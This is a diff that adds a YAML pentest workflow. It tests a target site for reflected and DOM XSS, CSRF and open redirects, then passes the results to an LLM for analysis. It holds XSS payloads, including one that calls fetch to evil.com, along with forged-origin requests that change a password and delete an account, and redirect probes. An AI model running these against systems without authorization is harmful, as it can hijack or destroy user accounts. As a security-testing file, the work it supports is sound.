@@ -1,0 +1,152 @@
+# Pentest: Client-Side Attacks
+# OWASP A03/A07 — XSS, CSRF, Open Redirect, Cache Poisoning
+id: pentest_client_side
+name: Client-Side Attack Test
+version: "1.0.0"
+description: XSS, CSRF, open redirects, web cache poisoning
+
+steps:
+  - id: start
+    module: flow.start
+    label: Start
+    params: {}
+    orderIndex: 0
+
+  - id: launch
+    module: browser.launch
+    label: Launch Browser
+    params:
+      stealth: true
+      headless: true
+    orderIndex: 1
+
+  - id: xss_reflected
+    module: http.batch
+    label: Reflected XSS Probes
+    params:
+      requests:
+        - method: GET
+          url: '{{target_url}}/search?q=<script>alert(1)</script>'
+        - method: GET
+          url: '{{target_url}}/search?q="><img src=x onerror=alert(1)>'
+        - method: GET
+          url: '{{target_url}}/search?q=javascript:alert(1)'
+        - method: GET
+          url: "{{target_url}}/search?q='-alert(1)-'"
+        - method: GET
+          url: '{{target_url}}/search?q=<svg/onload=alert(1)>'
+        - method: GET
+          url: "{{target_url}}/api/error?msg=<img src=x onerror=fetch('https://evil.com')>"
+      detect_patterns:
+        - "<script>alert"
+        - "onerror=alert"
+        - "onload=alert"
+    orderIndex: 2
+
+  - id: xss_dom
+    module: browser.evaluate
+    label: DOM XSS Check
+    params:
+      script: |
+        (function() {
+          const results = { sinks: [], sources: [] };
+          const scripts = [...document.querySelectorAll('script:not([src])')];
+
+          // Check for DOM XSS sinks
+          const sinkPatterns = [
+            'innerHTML', 'outerHTML', 'document.write', 'document.writeln',
+            'eval(', 'setTimeout(', 'setInterval(', 'Function(',
+            '.src=', '.href=', '.action=', 'location='
+          ];
+          const sourcePatterns = [
+            'location.hash', 'location.search', 'location.href',
+            'document.URL', 'document.referrer', 'window.name',
+            'document.cookie', 'postMessage'
+          ];
+
+          for (const s of scripts) {
+            const code = s.textContent || '';
+            for (const sink of sinkPatterns) {
+              if (code.includes(sink)) results.sinks.push(sink);
+            }
+            for (const src of sourcePatterns) {
+              if (code.includes(src)) results.sources.push(src);
+            }
+          }
+
+          // Check URL fragment handling
+          results.hash_used = document.documentElement.innerHTML.includes('location.hash');
+          results.postmessage_listeners = document.documentElement.innerHTML.includes("addEventListener('message");
+
+          return JSON.stringify(results, null, 2);
+        })()
+    orderIndex: 3
+
+  - id: csrf_check
+    module: http.batch
+    label: CSRF Check
+    params:
+      description: Test state-changing endpoints without CSRF token
+      requests:
+        - method: POST
+          url: "{{target_url}}/api/settings"
+          headers:
+            Content-Type: "application/json"
+            Origin: "https://evil.com"
+          body: '{"theme": "dark"}'
+        - method: POST
+          url: "{{target_url}}/api/password/change"
+          headers:
+            Content-Type: "application/json"
+            Origin: "https://evil.com"
+          body: '{"password": "hacked123"}'
+        - method: DELETE
+          url: "{{target_url}}/api/account"
+          headers:
+            Origin: "https://evil.com"
+      expect_status: [401, 403]
+    orderIndex: 4
+
+  - id: open_redirect
+    module: http.batch
+    label: Open Redirect Probes
+    params:
+      requests:
+        - method: GET
+          url: "{{target_url}}/redirect?url=https://evil.com"
+          follow_redirects: false
+        - method: GET
+          url: "{{target_url}}/login?next=//evil.com"
+          follow_redirects: false
+        - method: GET
+          url: "{{target_url}}/goto?url=https://evil.com%2F%2F"
+          follow_redirects: false
+        - method: GET
+          url: "{{target_url}}/redirect?url=javascript:alert(1)"
+          follow_redirects: false
+      detect_redirect_to: ["evil.com"]
+    orderIndex: 5
+
+  - id: analyze
+    module: llm.agent
+    label: Analyze Results
+    params:
+      model: gpt-4o
+      prompt: |
+        Analyze client-side attack test results.
+
+        Reflected XSS: ${xss_reflected.data}
+        DOM XSS: ${xss_dom.data}
+        CSRF: ${csrf_check.data}
+        Open Redirect: ${open_redirect.data}
+
+        Output JSON: { "findings": [...], "severity": "...", "summary": "..." }
+    orderIndex: 6
+
+edges:
+  - { source: start, target: launch }
+  - { source: launch, target: xss_reflected }
+  - { source: xss_reflected, target: xss_dom }
+  - { source: xss_dom, target: csrf_check }
+  - { source: csrf_check, target: open_redirect }
+  - { source: open_redirect, target: analyze }
